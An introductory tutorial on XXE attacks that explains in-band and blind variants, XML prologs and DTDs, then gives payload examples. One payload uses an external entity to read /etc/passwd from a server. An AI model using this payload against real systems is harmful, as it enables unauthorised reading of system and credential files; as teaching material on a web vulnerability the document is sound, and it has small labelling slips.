# What is an xxe attack ? 

> An xxe attack is carried using xml this attack abuses the features of xml. Using this vulnerability you can cause all kinds of problems such as denial of service attack [dos] or even SSRF which makes request to other applications on your behalf. 

There are two types of xxe attacks namely: 

1. IN-BAND 
1. OUT-OF-BAND a.k.a blind xxe. 

## Difference between the two: 

> 1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.

> 2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.

## Syntax

Each and every xml file has a prolog which specifies which xml version is being used and its encoding format. 

````
<?xml version="1.0" encoding="UTF-8"?> // prolog 
<mail> // root element 
   <to>falcon</to> //child elements
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail> //end of root element

````
# What is .dtd in xml ? 

DTD stands for documetn type definition. Remember the days when we use to write <!doctype html> yup that !doctype tag is being used here too. 

## Example 

Let me show a example for better understanding: 

Filename: note.dtd
````
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
````
Here's what they mean: 
!DOCTYPE note -  Defines a root element of the document named note
!ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
!ELEMENT to - Defines the to element to be of type "#PCDATA"
!ELEMENT from - Defines the from element to be of type "#PCDATA"
!ELEMENT heading  - Defines the heading element to be of type "#PCDATA"
!ELEMENT body - Defines the body element to be of type "#PCDATA"

*NOTE:* #PCDATA means parseable character data.

we use this dtd file to validate the information for your xml document and make sure that the xml file gives the same shape as intended. Check out it's output below.

Filename: note.dtd

````
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>

````

## SOME PAYLOAD EXAMPLES: 

Here's how you can read system files using xml. 

````
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
````

Here's how you can replace data using xml. 

````
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
````
